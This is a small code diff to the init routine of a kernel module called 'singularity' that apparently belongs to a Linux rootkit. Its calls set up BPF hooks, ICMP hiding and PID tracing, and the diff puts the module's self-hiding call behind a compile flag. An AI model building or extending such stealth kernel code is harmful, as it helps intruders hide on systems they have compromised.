@@ -37,7 +37,9 @@ static int __init singularity_init(void) {
     ret |= bpf_hook_init();
     ret |= hiding_icmp_init();
     ret |= trace_pid_init();
+#ifdef HIDE_MODULE
     module_hide_current(); // optional
+#endif
     return ret;
 }
 
